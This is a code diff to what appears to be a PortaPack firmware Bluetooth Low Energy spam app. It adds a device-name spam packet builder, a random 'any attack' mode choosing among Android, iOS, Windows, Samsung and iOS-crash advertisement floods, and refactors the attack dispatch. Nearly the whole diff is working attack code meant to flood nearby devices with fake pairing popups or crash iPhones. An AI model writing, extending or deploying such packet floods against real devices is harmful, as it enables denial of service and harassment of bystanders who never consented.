@@ -20,7 +20,7 @@
  * Boston, MA 02110-1301, USA.
  */
 
-// Code from https://github.com/Flipper-XFW/Xtreme-Apps/tree/04c3a60093e2c2378e79498b4505aa8072980a42/ble_spam/protocols
+// Code from https://github.com/Next-Flip/Momentum-Apps/blob/dev/ble_spam/
 // Thanks for the work of the original creators!
 
 #include "ui_blespam.hpp"
@@ -109,7 +109,8 @@ BLESpamView::BLESpamView(NavigationView& nav)
     console.writeln("Based on work of:");
     console.writeln("@Willy-JL, @ECTO-1A,");
     console.writeln("@Spooks4576, @iNetro");
-    console.writeln("");
+    console.writeln("---");
+    console.writeln("iOS crash + Android\nattacks are patched\non new devices.");
 #endif
     changePacket(true);  // init
 }
@@ -287,6 +288,39 @@ void BLESpamView::createWindowsPacket() {
     packet[i++] = 0x80;                  // Reserved RSSI Byte
     memcpy(&packet[i], name, name_len);  // Device Name
     i += name_len;
+    // size, packet
+    std::string res = to_string_hex_array(packet, size);
+    memset(advertisementData, 0, sizeof(advertisementData));
+    std::copy(res.begin(), res.end(), advertisementData);
+}
+
+void BLESpamView::createNameSpamPacket() {
+    const char* names[] = {"PortaHack", "PwnBt", "iSpam", "GenericFoodVagon", "SignalSnoop", "ByteBandit", "RadioRogue", "RadioRebel", "ByteBlast"};
+
+    const char* name = names[rand() % 9];  //"PortaHack";
+    uint8_t name_len = strlen(name);
+
+    uint8_t size = 12 + name_len;
+    uint8_t i = 0;
+
+    packet[i++] = 2;     // Size
+    packet[i++] = 0x01;  // AD Type (Flags)
+    packet[i++] = 0x06;  // Flags
+
+    packet[i++] = name_len + 1;          // Size
+    packet[i++] = 0x09;                  // AD Type (Complete Local Name)
+    memcpy(&packet[i], name, name_len);  // Device Name
+    i += name_len;
+
+    packet[i++] = 3;     // Size
+    packet[i++] = 0x02;  // AD Type (Incomplete Service UUID List)
+    packet[i++] = 0x12;  // Service UUID (Human Interface Device)
+    packet[i++] = 0x18;  // ...
+
+    packet[i++] = 2;     // Size
+    packet[i++] = 0x0A;  // AD Type (Tx Power Level)
+    packet[i++] = 0x00;  // 0dBm
+
     // size, packet
     std::string res = to_string_hex_array(packet, size);
     memset(advertisementData, 0, sizeof(advertisementData));
@@ -509,6 +543,48 @@ void BLESpamView::createFastPairPacket() {
     std::copy(res.begin(), res.end(), advertisementData);
 }
 
+void BLESpamView::createAnyPacket(bool safe) {
+    ATK_TYPE type[] = {
+        ATK_ANDROID,
+        ATK_IOS,
+        ATK_WINDOWS,
+        ATK_SAMSUNG,
+        ATK_NAMESPAM,
+        ATK_IOS_CRASH};
+    ATK_TYPE attackType = type[rand() % (COUNT_OF(type) - (1 ? safe : 0))];
+    createPacket(attackType);
+}
+
+void BLESpamView::createPacket(ATK_TYPE attackType) {
+    switch (attackType) {
+        case ATK_IOS_CRASH:
+            createIosPacket(true);
+            break;
+        case ATK_IOS:
+            createIosPacket(false);
+            break;
+        case ATK_SAMSUNG:
+            createSamsungPacket();
+            break;
+        case ATK_WINDOWS:
+            createWindowsPacket();
+            break;
+        case ATK_NAMESPAM:
+            createNameSpamPacket();
+            break;
+        case ATK_ALL_SAFE:
+            createAnyPacket(true);
+            break;
+        case ATK_ALL:
+            createAnyPacket(false);
+            break;
+        default:
+        case ATK_ANDROID:
+            createFastPairPacket();
+            break;
+    }
+}
+
 void BLESpamView::changePacket(bool forced = false) {
     counter++;  // need to send it multiple times to be accepted
     if (counter >= 4 || forced) {
@@ -517,24 +593,7 @@ void BLESpamView::changePacket(bool forced = false) {
         randomizeMac();
         randomChn();
         if (randomDev || forced) {
-            switch (attackType) {
-                case ATK_IOS_CRASH:
-                    createIosPacket(true);
-                    break;
-                case ATK_IOS:
-                    createIosPacket(false);
-                    break;
-                case ATK_SAMSUNG:
-                    createSamsungPacket();
-                    break;
-                case ATK_WINDOWS:
-                    createWindowsPacket();
-                    break;
-                default:
-                case ATK_ANDROID:
-                    createFastPairPacket();
-                    break;
-            }
+            createPacket(attackType);
         }
 // rate limit console display
 #ifdef BLESPMUSECONSOLE
